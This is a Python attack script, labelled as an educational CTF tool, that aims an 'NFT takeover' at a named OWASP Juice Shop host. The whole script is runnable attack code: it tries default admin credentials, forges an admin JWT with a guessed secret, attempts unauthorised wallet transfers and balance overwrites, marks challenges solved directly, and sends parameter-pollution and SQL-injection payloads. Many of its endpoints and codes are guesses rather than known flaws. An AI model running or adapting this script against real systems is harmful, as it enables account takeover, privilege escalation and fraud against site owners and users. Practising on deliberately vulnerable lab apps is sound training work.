#!/usr/bin/env python3
"""
OWASP Juice Shop NFT Takeover Script
For juice5.wonkatech.org CTF Challenge
=====================================
Educational CTF Challenge Only!
"""

import requests
import json
import base64
import jwt
import time
from urllib.parse import quote

class JuiceShopNFTTakeover:
    def __init__(self):
        self.base_url = "https://juice5.wonkatech.org"
        self.session = requests.Session()
        self.session.verify = False  # For self-signed certs
        self.token = None
        self.user_id = None

        # Suppress SSL warnings for CTF
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        print("[*] Starting Juice Shop NFT Takeover")
        print(f"[*] Target: {self.base_url}")
        print("-" * 50)

    def register_account(self):
        """Register a new account for testing"""
        import random
        import string

        username = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{username}@test.com"
        password = "Password123!"

        print(f"[*] Registering account: {email}")

        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {
                "id": 1,
                "question": "Your eldest siblings middle name?"
            },
            "securityAnswer": "test"
        }

        try:
            response = self.session.post(
                f"{self.base_url}/api/Users/",
                json=register_data,
                headers={"Content-Type": "application/json"}
            )

            if response.status_code in [200, 201]:
                print(f"[+] Registration successful!")
                return email, password
            else:
                print(f"[-] Registration failed: {response.text}")
                return None, None
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return None, None

    def login(self, email=None, password=None):
        """Login to get JWT token"""
        if not email:
            email = "admin@juice-sh.op"  # Try default admin
            password = "admin123"

        print(f"[*] Attempting login as: {email}")

        login_data = {
            "email": email,
            "password": password
        }

        try:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json=login_data,
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()
                self.token = data.get('authentication', {}).get('token')

                if self.token:
                    print(f"[+] Login successful! Token obtained")

                    # Decode JWT to get user info
                    try:
                        decoded = jwt.decode(self.token, options={"verify_signature": False})
                        self.user_id = decoded.get('data', {}).get('id')
                        print(f"[+] User ID: {self.user_id}")
                    except:
                        pass

                    # Add token to session headers
                    self.session.headers.update({
                        "Authorization": f"Bearer {self.token}",
                        "Cookie": f"token={self.token}"
                    })

                    return True
            else:
                print(f"[-] Login failed: {response.text}")

        except Exception as e:
            print(f"[-] Login error: {e}")

        return False

    def find_nft_endpoints(self):
        """Discover NFT-related endpoints"""
        print("\n[*] Discovering NFT endpoints...")

        potential_endpoints = [
            "/api/nft",
            "/api/nfts",
            "/api/wallet",
            "/api/wallets",
            "/api/Products",  # Juice Shop uses Products
            "/rest/products",
            "/api/BasketItems",
            "/rest/basket",
            "/api/Challenges",
            "/rest/continue-code",
            "/rest/wallet",
            "/rest/nft",
            "/api-docs",
            "/swagger",
        ]

        found_endpoints = []

        for endpoint in potential_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code in [200, 401, 403]:
                    print(f"[+] Found endpoint: {endpoint} (Status: {response.status_code})")
                    found_endpoints.append(endpoint)

                    # Check if it contains NFT/wallet related data
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if any(keyword in str(data).lower() for keyword in ['nft', 'wallet', 'token', 'owner']):
                                print(f"    [!] Contains NFT/wallet keywords!")
                        except:
                            pass

            except Exception as e:
                pass

        return found_endpoints

    def check_wallet_balance(self):
        """Check wallet/balance endpoints"""
        print("\n[*] Checking wallet/balance...")

        wallet_endpoints = [
            f"/rest/wallet/balance",
            f"/api/wallet/balance",
            f"/rest/user/whoami",
            f"/api/Users/{self.user_id}" if self.user_id else "/api/Users/1",
        ]

        for endpoint in wallet_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    print(f"[+] Wallet info from {endpoint}:")
                    print(json.dumps(response.json(), indent=2))
            except:
                pass

    def attempt_nft_takeover(self):
        """Main NFT takeover attempts"""
        print("\n[*] Attempting NFT Takeover...")

        # Method 1: JWT Manipulation
        print("\n[1] Testing JWT Manipulation...")
        if self.token:
            try:
                # Decode without verification
                decoded = jwt.decode(self.token, options={"verify_signature": False})
                print(f"    Original JWT payload: {decoded}")

                # Try to modify the JWT
                decoded['data']['id'] = 1  # Admin ID
                decoded['data']['email'] = "admin@juice-sh.op"
                decoded['data']['role'] = "admin"

                # Create new JWT without signature verification
                fake_token = jwt.encode(decoded, "secret", algorithm="HS256")

                # Try using the fake token
                headers = {"Authorization": f"Bearer {fake_token}"}
                response = self.session.get(
                    f"{self.base_url}/rest/wallet/balance",
                    headers=headers
                )

                if response.status_code == 200:
                    print("[+] JWT manipulation successful!")
                    return True

            except Exception as e:
                print(f"    [-] JWT manipulation failed: {e}")

        # Method 2: Direct API manipulation
        print("\n[2] Testing Direct API Manipulation...")

        # Try to transfer NFT/funds
        transfer_payloads = [
            {"to": self.user_id or 2, "from": 1, "amount": 1000},
            {"userId": 1, "amount": 1000},
            {"walletId": 1, "transfer": True},
        ]

        for payload in transfer_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/rest/wallet/transfer",
                    json=payload
                )

                if response.status_code in [200, 201]:
                    print(f"[+] Transfer successful with: {payload}")
                    return True

                # Also try PUT
                response = self.session.put(
                    f"{self.base_url}/api/wallet/1",
                    json={"balance": 99999}
                )

                if response.status_code in [200, 201]:
                    print("[+] Wallet manipulation successful!")
                    return True

            except:
                pass

        # Method 3: Challenge-specific exploit
        print("\n[3] Testing Challenge-Specific Exploits...")

        # OWASP Juice Shop often has specific challenge codes
        challenge_codes = [
            "nft-takeover",
            "NFT_TAKEOVER",
            "wallet-takeover",
            "WALLET_TAKEOVER"
        ]

        for code in challenge_codes:
            try:
                # Try continue code endpoint
                response = self.session.get(
                    f"{self.base_url}/rest/continue-code/{code}"
                )

                if response.status_code == 200:
                    print(f"[+] Challenge code accepted: {code}")
                    return True

                # Try as challenge solution
                response = self.session.put(
                    f"{self.base_url}/api/Challenges/{code}",
                    json={"solved": True}
                )

                if response.status_code in [200, 201]:
                    print(f"[+] Challenge solved with code: {code}")
                    return True

            except:
                pass

        # Method 4: Parameter Pollution
        print("\n[4] Testing Parameter Pollution...")

        pollution_urls = [
            f"{self.base_url}/rest/wallet/balance?userId=1&userId={self.user_id}",
            f"{self.base_url}/api/wallet?id=1&id={self.user_id}",
            f"{self.base_url}/rest/products/1?userId={self.user_id}&owner=admin",
        ]

        for url in pollution_urls:
            try:
                response = self.session.get(url)
                if response.status_code == 200:
                    data = response.json()
                    if "admin" in str(data).lower() or "success" in str(data).lower():
                        print(f"[+] Parameter pollution successful at: {url}")
                        return True
            except:
                pass

        # Method 5: SQL Injection for NFT/Wallet
        print("\n[5] Testing SQL Injection...")

        sqli_payloads = [
            "' OR 1=1--",
            "admin'--",
            "1 OR 1=1",
            "1' UNION SELECT * FROM wallets--",
        ]

        for payload in sqli_payloads:
            try:
                # Try in search
                response = self.session.get(
                    f"{self.base_url}/rest/products/search?q={quote(payload)}"
                )

                if "nft" in response.text.lower() or "wallet" in response.text.lower():
                    print(f"[+] SQL injection revealed NFT/wallet data!")
                    print(f"    Payload: {payload}")
                    return True

            except:
                pass

        return False

    def check_scoreboard(self):
        """Check if challenge is completed"""
        print("\n[*] Checking scoreboard...")

        try:
            response = self.session.get(f"{self.base_url}/#/score-board")
            # The scoreboard might need special access

            # Try the API endpoint
            response = self.session.get(f"{self.base_url}/api/Challenges/")

            if response.status_code == 200:
                challenges = response.json()
                for challenge in challenges.get('data', []):
                    if 'nft' in challenge.get('name', '').lower():
                        if challenge.get('solved'):
                            print(f"[+] NFT Challenge SOLVED: {challenge['name']}")
                            return True
                        else:
                            print(f"[-] NFT Challenge not yet solved: {challenge['name']}")

        except Exception as e:
            print(f"[-] Scoreboard check error: {e}")

        return False

    def run(self):
        """Run the full NFT takeover attempt"""
        print("\n" + "="*50)
        print("JUICE SHOP NFT TAKEOVER - STARTING")
        print("="*50)

        # Step 1: Try to register/login
        email, password = self.register_account()

        if email:
            self.login(email, password)
        else:
            # Try default credentials
            self.login()

        # Step 2: Find endpoints
        self.find_nft_endpoints()

        # Step 3: Check current wallet
        self.check_wallet_balance()

        # Step 4: Attempt takeover
        success = self.attempt_nft_takeover()

        # Step 5: Verify success
        if success:
            print("\n" + "="*50)
            print("[+] NFT TAKEOVER SUCCESSFUL!")
            print("="*50)

            # Check scoreboard
            self.check_scoreboard()

            # Check new balance
            self.check_wallet_balance()
        else:
            print("\n" + "="*50)
            print("[-] NFT Takeover not successful yet")
            print("[!] Try manual investigation of the endpoints found")
            print("="*50)

        return success


if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║   OWASP Juice Shop NFT Takeover Tool    ║
    ║      juice5.wonkatech.org Challenge     ║
    ║         EDUCATIONAL CTF USE ONLY!       ║
    ╚══════════════════════════════════════════╝
    """)

    takeover = JuiceShopNFTTakeover()
    takeover.run()

    print("\n[*] Additional manual steps to try:")
    print("1. Check /api-docs or /swagger for API documentation")
    print("2. Look for hidden NFT/wallet endpoints in JavaScript files")
    print("3. Try manipulating product prices (some are marked as NFTs)")
    print("4. Check browser DevTools Network tab while browsing")
    print("5. Look for JWT vulnerabilities (weak secret, none algorithm)")
    print("6. Check for IDOR vulnerabilities in user/wallet endpoints")